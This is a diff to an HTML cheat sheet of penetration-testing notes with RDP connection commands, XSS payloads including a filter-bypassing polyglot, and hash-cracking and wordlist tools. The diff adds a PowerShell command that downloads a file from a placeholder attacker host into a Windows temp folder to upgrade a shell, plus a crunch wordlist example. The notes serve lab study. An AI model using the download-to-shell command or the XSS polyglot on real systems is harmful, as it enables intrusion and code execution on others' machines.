@@ -15,6 +15,9 @@ There is a :
 <h3>Remote Desktop Protocol (rdp)</h3>
   xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:User /p:'Password'
   <p>xfreerdp /v:10.10.38.213 /u:User /p:Password +clipboard
+	
+<h3>To get stable shell from unstable from PowerShell</h3>
+  powershell -c "Invoke-WebRequest -Uri 'http://<IP>:<PORT>/<filename>' -OutFile 'C:\Windows\Temp\<filename>'"
 
 <h2 id='n2'><em>Payloads</em></h2>
     <h3>XSS Payloads</h3>
@@ -28,6 +31,7 @@ There is a :
       <p>This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail().
     <li><b>Polyglots</b> - jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('Success XSS!'))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('Success XSS!')//>\x3e
       <p>An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.
+	      
         
 <h2 id='n3'><em>Sites</em></h2>
       <li> <a href='https://crackstation.net/'>crackstation.net</a> - online password hash cracker
@@ -52,4 +56,6 @@ There is a :
 	        	<p> Tools for change files signature. <a href='https://en.wikipedia.org/wiki/List_of_file_signatures'>Link</a> to Wiki with List of file signatures. 
 		<li><h3><a href='https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master'>Tool</a> for hash identification.</h3> 
 			<p> Python file. Very useful.
+		<li><h3><a href='https://www.kali.org/tools/crunch/'>Crunch</a></h3>
+		   <p> This is one of many powerful tools for creating an offline wordlist. With crunch, you can specify numerous options, including min, max, and options. The following example creates a wordlist containing all possible combinations of 3 characters, including 1-5 and qwerty. You can use the -o argument to save. <p>Example: crunch 3 3 12345qwerty -o cranch.txt.
 	</ol>
